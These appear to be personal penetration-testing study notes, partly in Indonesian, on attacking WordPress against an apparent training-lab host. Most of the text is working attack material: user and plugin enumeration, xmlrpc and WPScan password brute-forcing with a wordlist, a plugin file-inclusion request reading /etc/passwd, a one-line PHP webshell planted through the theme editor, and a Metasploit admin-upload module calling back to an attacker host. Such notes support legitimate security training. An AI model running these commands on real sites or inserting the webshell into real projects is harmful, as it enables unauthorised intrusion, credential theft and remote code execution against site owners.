# Hacking Wordpress

Wordpress file structure

```sh
tree -L 1 /var/www/html
.
├── index.php
├── license.txt * => check version
├── readme.html
├── wp-activate.php * => email activation
├── wp-admin
	- login.php *
	- wp-login.php *
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php *
├── wp-config-sample.php
├── wp-content
	├── index.php
	├── plugins
	└── themes
├── wp-cron.php
├── wp-includes
	├── theme.php
	├── update.php
	├── user.php
	├── vars.php
	├── version.php
	├── widgets
	├── widgets.php
	├── wlwmanifest.xml
	├── wp-db.php
	└── wp-diff.php
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php *
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php *
- login.php (kalau ada)
```

| Role          | Description                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Administrator | This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code. |
| Editor        | An editor can publish and manage posts, including the posts of other users.                                                                            |
| Author        | Authors can publish and manage their own posts.                                                                                                        |
| Contributor   | These users can write and manage their own posts but cannot publish them.                                                                              |
| Subscriber    | These are normal users who can browse posts and edit their profiles.                                                                                   |
## Find version

Source code
```sh
curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
```

## Find plugins and themes

Passive enum
```sh
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

Bisa pakai [[#WPScan]]

## Directory indexing

```sh
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text

****** Index of /wp-content/plugins/mail-masta ******
[[ICO]]       Name                 Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                         -  
[[DIR]]       amazon_api/          2020-05-13 18:01    -  
[[DIR]]       inc/                 2020-05-13 18:01    -  
[[DIR]]       lib/                 2020-05-13 18:01    -  
[[   ]]       plugin-interface.php 2020-05-13 18:01  88K  
[[TXT]]       readme.txt           2020-05-13 18:01 2.2K  
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80
```

## User Enumeration

```sh
curl -s -I http://blog.inlanefreight.com/?author=1
```

301 ada, 404 gaada

Untuk versi 4.7.1 ke atas

```sh
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```

## Attack login

Manfaatin XMLRPC.php

```sh
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

## WPScan

```sh
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```

## Exploit

##### Vulnerable plugins

```shell-session
curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

##### User Bruteforce

```shell-session
wpscan --password-attack xmlrpc -t 20 -U admin, david -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.com
```

##### RCE via Theme editor

Pasang webshell dulu di theme nonaktif

```php
<?php system($_GET['cmd']); ?>
```

```sh
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

##### Attack Wordpress with Metasploit

```
msfconsole
search wp_admin
use 0
options
set rhosts blog.inlanefreight.com
set username admin
set password Winter2020
set lhost 10.10.16.8
run
```